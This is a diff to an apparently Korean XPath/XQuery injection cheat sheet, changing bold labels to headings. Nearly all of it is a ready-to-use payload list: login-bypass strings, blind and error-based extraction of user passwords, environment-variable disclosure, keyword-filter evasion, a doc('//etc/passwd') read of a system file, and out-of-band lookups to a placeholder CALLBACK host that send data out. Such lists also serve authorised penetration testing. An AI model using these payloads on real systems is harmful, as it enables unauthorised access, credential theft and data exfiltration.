@@ -9,27 +9,27 @@
 - `']%00` (NULL byte 종결, 일부 엔진)
 - `' or 1=1 or ''='` (OR 변형)
 
-**JSON body:**
+#### JSON body
 ```json
 {"username":"admin' or '1'='1","password":"x"}
 {"username":"admin","password":"' or '1'='1"}
 ```
 
-**더블쿼트 컨텍스트:**
+#### 더블쿼트 컨텍스트
 - `" or "1"="1` (server uses double quotes)
 - `concat('a',"'",'b')` (quote 함수 우회)
 
-**숫자 컨텍스트 (따옴표 불필요):**
+#### 숫자 컨텍스트 (따옴표 불필요)
 - `1 or 1=1` (position()=${idx} 컨텍스트)
 - `1 or position()>0`
 
-**데이터 유출:**
+#### 데이터 유출
 - `' or 1=1 or 'a'='b` (모든 노드 매칭)
 - `' or count(//user)>0 or 'a'='b` (노드 수 확인)
 - `' or //user[name='admin']/password or 'a'='b` (XPath 2.0+ 직접 추출)
 - `'/parent::*/child::node()` (트리 walk)
 
-**Blind extraction (Boolean):**
+#### Blind extraction (Boolean)
 ```
 # 첫 글자 추출
 ' or substring(//user[1]/password,1,1)='a' or 'a'='b
@@ -52,21 +52,21 @@
 - `' or document('https://CALLBACK/x') or 'a'='b` (XSLT 환경)
 - `' or fn:doc('https://CALLBACK/x')` (XQuery)
 
-**에러 기반:**
+#### 에러 기반
 - `'` (단일 따옴표 — XPath syntax 에러 유발)
 - `' or error(QName('','x'),//user[1]/password) or 'a'='b` (XPath 2.0)
 
-**XPath 2.0+ 환경 정보 노출:**
+#### XPath 2.0+ 환경 정보 노출
 - `' or environment-variable('PATH') or 'a'='b`
 - `' or system-property('xsl:vendor') or 'a'='b`
 
-**XQuery injection:**
+#### XQuery injection
 ```
 declare function local:x() { doc('//etc/passwd') }; local:x()
 let $x := doc('http://CALLBACK/x') return $x
 ```
 
-**Attribute name injection:**
+#### Attribute name injection
 - `//user[@${attr}='value']` — 속성명 자체가 입력이면 다른 속성 매칭
 - `//user[@*='admin']` (모든 속성 매칭)
 
@@ -84,7 +84,7 @@ let $x := doc('http://CALLBACK/x') return $x
 | 키워드 블랙리스트 (`or`) | 대소문자 (`OR`/`Or`), 공백 변형 (`o\nr`), `union`/`|` (XPath union operator) 사용 |
 | 길이 제한 | `'or 1` (5자), `'or'1` (5자) |
 
-**키워드 분할 우회:**
+#### 키워드 분할 우회
 ```
 'or  ''=''     (공백 2개 — 일부 정규식 우회)
 ' OR ''='	'  (TAB 삽입)
